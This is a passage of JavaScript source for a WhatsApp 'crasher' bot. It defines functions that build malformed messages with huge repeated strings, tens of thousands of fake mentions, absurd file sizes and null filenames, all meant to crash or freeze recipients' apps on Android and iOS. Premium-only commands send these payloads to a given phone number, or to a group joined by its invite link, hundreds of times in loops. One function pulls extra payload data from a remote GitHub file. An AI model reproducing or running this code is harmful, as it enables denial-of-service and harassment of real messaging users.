                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}

async function CosmoBlankX(target) {
  const Hytam = '_*~@2~*_\n'.repeat(10500);
  const Legam = 'ꦽ'.repeat(10000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '༑Kontol⍣᳟Bapakkaupecah꙳⟅🩸' + Hytam + Legam,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "Hades Document Killer",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await rikz.relayMessage(target, message, { participant: { jid: target } });
}

async function ProtoXAudio(target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "CikssXyz Is Heree Baybyy" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
//FUNC - GRUB
async function Loc(isTarget, amount, jids) {
let pesan = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
locationMessage: {},
hasMediaAttachment: true
},
body: {
text: "𝕽𝖆𝖟𝖐𝖎 𝕮𝖗𝖆𝖘𝖍𝖊𝖗🎭"
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}, {
name: "single_select",
buttonParamsJson: `{"title":"${"\u0018".repeat(amount)}","sections":[{"title":"Flow Button","rows":[]}]}`
}
]
}
}
},
carouselMessage: {
cards: []
}
}
}), {
userJid: isTarget,
quoted: null
});

await rikz.relayMessage(isTarget, pesan.message, jids ? {
participant: { jid: isTarget }
} : {});
console.log("sucses bug by 𝕽𝖆𝖟𝖐𝖎 𝕮𝖗𝖆𝖘𝖍𝖊𝖗🎭")
}
//======================
async function SpaceGroup(isTarget) {
if (!isTarget.includes("@s.whatsapp.net") && !isTarget.includes("@g.us")) {
console.error("Error: Target JID tidak valid!", isTarget);
return;
}

let apiGrup;
try {
  const res = await fetch('https://raw.githubusercontent.com/alwaysZuroku/AlwaysZuroku/main/ApiClient.json');
  apiGrup = await res.text();
} catch (err) {
  console.error("error fetching", err);
  return;
}

let Msg = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [isTarget],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: isTarget,
},
},
body: {
text: "⿻𝕽𝖆𝖟𝖏𝖎 𝕮𝖗𝖆𝖘𝖍𝖊𝖗⿻🎭",
},
nativeFlowMessage: {
buttons: [
{  name: "single_select",
buttonParamsJson: apiGrup + "sat 𝐈𝐬 𝐇𝐞𝐫𝐞??",
},
{
name: "call_permission_request",
buttonParamsJson: apiGrup + "sat 𝐈𝐬 𝐇𝐞𝐫𝐞🎭〽️",
}, 
{
name: "call_permission_request",
buttonParamsJson: venomModsData + "⿻͠𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇⿻",
}, 
{
name: "payment_method",
buttonParamsJson: venomModsData + "⿻͠𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇⿻",
},
{
name: "payment_status",
buttonParamsJson: ""
},
{
name: "review_order",
buttonParamsJson: "" }
],
},
},
},
},
};
for (let i = 0; i < 7; i++) {  
try {
await rikz.relayMessage(isTarget, Msg, {});
await new Promise(resolve => setTimeout(resolve, 1000));
} catch (err) {
console.error("Error mengirim bug:", err);
break; 
}
}
}
//======================
switch (command) {
//case bug
case "gyzen-delay": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);

target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

m.reply(`*[!] bug successfully sent to target*`); 

          for (let i = 0; i < 870; i++) {
            await carouselNew(target)
            await bulldozer(target)
            await carouselNew(target)
            await bulldozer(target)
            await DelayStc(langgxyz, target)
            await DelayStc(langgxyz, target)
            await carouselNew(target)
            await bulldozer(target)
            await carouselNew(target)
            await bulldozer(target)
            await DelayStc(langgxyz, target)
            await DelayStc(langgxyz, target)       
            await SockMentionJid3(target, false)
            await SockMentionJid3(target, false)
            await SockMentionJid3(target, false)
            await BaccaratUi(langgxyz, target)
            await BaccaratUi(langgxyz, target)
            await BaccaratUi(langgxyz, target)
            await CosmoBlankX(target) 
            await CosmoBlankX(target) 
            await CosmoBlankX(target) 
            await CosmoBlankX(target)
        }

    }

  

break;
//======================
case "gyzen-delayv2": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await protocolbug2(target, true)
            await protocolbug1(target, true) 
            await protocolbug2(target, true)
            await protocolbug3(target, true)
            await protocolbug4(target, true)
            await VampPaymentCrash(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, true)
            await protocolbug5v2(target, false)
            await protocolbug5v2(target, false)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await VampDelayMess(langgxyz, target)
            await VampPrivateBlank(langgxyz, target)
            await VampDelayCrash(langgxyz, target)
            await VampBroadcast(langgxyz, target, true)
            await mentionSw(target)
            await carouselNew(target)
        }
    }
  
break;
//======================
case "bulldozer": {
    
if (!isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
            await bulldozer(target);
        }
    }
  
break;
//======================
case "delay-system": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, true)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
            await protocolbug5(target, false)
        }

    }
  
break;

case "combo-dor": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`*[!] bug successfully sent to target*`); 
          for (let i = 0; i < 879; i++) {
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await bulldozer(target)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
            await ProtoXAudio(target, true)
        }

    }
  
break;
//=====================
case "invis-hard": {
    
if (!isPremium) return m.reply('Khusus Premium');  
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628xxx`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
          for (let i = 0; i < 35; i++) {
            await InvisHard(target);
            await sleep(1500);
            await InvisHard(target);
            await InvisHard(target);
            await sleep(2000);
            await InvisHard(target);
            await InvisHard(target);
            await sleep(1500);
            await InvisHard(target);
}
    }
  
break;
//=====================
case 'combo-ios': {
    if (!isPremium) return m.reply("Khusus Premium");
    if (!q) return m.reply("Example Usage:\n combo-ios 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return m.reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .combo-ios 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    m.reply(`✅ *Success!* Sent Bug: 𝗶𝗢𝗦 𝗖𝗿𝗮𝘀𝗵 to *${jidx}*`);

    //Paramater
    for (let r = 0; r < 6; r++) {
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=====================
case 'invis-ios': {
    if (!isPremium) return ransnew("Khusus Premium");
    if (!q) return m.reply("Example Usage:\n invis-ios 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return m.reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .invis-ios 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    m.reply(`✅ *Success!* Sent Bug: 𝗶𝗢𝗦 𝗖𝗿𝗮𝘀𝗵 to *${jidx}*`);

    //Paramater
    for (let r = 0; r < 6; r++) {
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await sleep(500)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=====================
case 'gyzen-ui': {
    if (!isPremium) return m.reply("Khusus Premium");
    if (!q) return m.reply("Example Usage:\n razki-ui 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return m.reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .razki-ui 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    m.reply(`✅ *Success!* Sent Bug: ui to *${jidx}*`);

    //Paramater
    for (let r = 0; r < 14; r++) {
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=====================
case 'ios-fc': {
    if (!isPremium) return m.reply("Khusus Premium");
    if (!q) return m.reply("Example Usage:\n ios-fc 62xx / @tag");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return m.reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .ios-fc 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    m.reply(`✅ *Success!* Sent Bug: 𝗶𝗢𝗦 𝗖𝗿𝗮𝘀𝗵 to *${jidx}*`);

    //Paramater
    for (let r = 0; r < 6; r++) {
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await VampDeviceCrash(target, Ptcp = true)
    await sleep(500)
    await VampDeviceCrash(target, Ptcp = true)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    await RansCrashIos(target)
    await sleep(500) 
    await RansCrashIos(target)
    await sleep(500)
    await RansCrashIos(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=====================
//case bug grub
case 'hard-grub': case 'penghancur-gc': { // 
    if (!isPremium) return m.reply("*Khusus Premium*");
    
    if (!q) {
        return m.reply(`Example: ${prefix+command} ID / Link Group`);
    }

    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) {
            return m.reply(`❌ *𝖫𝗂𝗇𝗄 𝗍𝖺𝗎𝗍𝖺𝗇 𝗍𝗂𝖽𝖺𝗄 𝗏𝖺𝗅𝗂𝖽. 𝗅𝖾𝖻𝗂𝗁 𝖻𝖺𝗂𝗄 𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗆𝖾𝗅𝖺𝗅𝗎𝗂 𝗂𝖽 𝖽𝖾𝗇𝗀𝖺𝗇 𝖼𝖺𝗋𝖺 𝗄𝖾𝗍𝗂𝗄 .𝖼𝖾𝗄𝗂𝖽𝗀𝖼*`);
        }

        try {
            let isTarget = await Ryc.groupAcceptInvite(groupId);
            m.reply(`
✅ *_รuccεรรƒułłყ รεหd Ъugร тคяgεт_*

𝗌𝖾𝗇𝗍 𝗍𝗈 𝗀𝗋𝗈𝗎𝗉 𝗐𝗂𝗍𝗁 𝗅𝗂𝗇𝗄: ${groupLink}\n> _𝖧𝖺𝗋𝖺𝗉 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗃𝖾𝖽𝖺 𝗆𝗂𝗇𝗂𝗆𝖺𝗅 10 𝗆𝖾𝗇𝗂𝗍 𝖺𝗀𝖺𝗋 𝖻𝗈𝗍 𝗍𝖾𝗋𝗁𝗂𝗇𝖽𝖺𝗋 𝖽𝖺𝗋𝗂 𝗄𝖾𝗇𝗈𝗇_`);

            for (let r = 0; r < 3; r++) { 
            await Loc(isTarget, 90000, false);
            await FlowX(isTarget);
            await Loc(isTarget, 90000, false);
    await buttonnull(target)
    await buttonnull(target)
    await protocolbug5(target, true)
    await buttonnull(target)
    await buttonnull(target)
    await protocolbug5(target, true)
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await Loc(isTarget, 90000, false);    await X(target, true)
    await sleep(500) 
    await NaviFlex(target, true)
    await sleep(500)
    await NaviFlex(target, true)
    await NaviFlex(target, true)
    await sleep(500) 
    await NaviFlex(target, true)
            await SpaceGroup(isTarget);
            await protocolbug5v2(2000);
            await FlowX(isTarget);
            await protocolbug5v2(2000);
            await SpaceGroup(isTarget);
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await RkBlankNotif(target, Ptcp = false)
    await ransHardUi(target, Ptcp = false)
            await protocolbug5v2(2000);
            }
        } catch (err) {
            return m.reply(`❌ *𝖫𝗂𝗇𝗄 𝗍𝖺𝗎𝗍𝖺𝗇 𝗍𝗂𝖽𝖺𝗄 𝗏𝖺𝗅𝗂𝖽. 𝗅𝖾𝖻𝗂𝗁 𝖻𝖺𝗂𝗄 𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗆𝖾𝗅𝖺𝗅𝗎𝗂 𝗂𝖽 𝖽𝖾𝗇𝗀𝖺𝗇 𝖼𝖺𝗋𝖺 𝗄𝖾??𝗂?? .𝖼𝖾𝗄𝗂𝖽𝗀𝖼*`);
        }

    } else {
        let isTarget = groupLink;
        m.reply(`
✅ *_รuccεรรƒułłყ รεหd Ъugร тคяgεт_*

𝗌𝖾𝗇𝗍 𝗍𝗈 𝗀𝗋𝗈𝗎𝗉 𝗐𝗂𝗍𝗁 𝗅𝗂𝗇𝗄: ${groupLink}\n> _𝖧𝖺𝗋𝖺𝗉 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝗃𝖾𝖽𝖺 𝗆𝗂𝗇𝗂𝗆𝖺𝗅 10 𝗆𝖾𝗇𝗂𝗍 𝖺𝗀𝖺𝗋 𝖻𝗈𝗍 𝗍𝖾𝗋𝗁𝗂𝗇𝖽𝖺𝗋 𝖽𝖺𝗋𝗂 𝗄𝖾𝗇𝗈𝗇_`);

        for (let r = 0; r < 3; r++) {
            await Loc(isTarget, 90000, false);
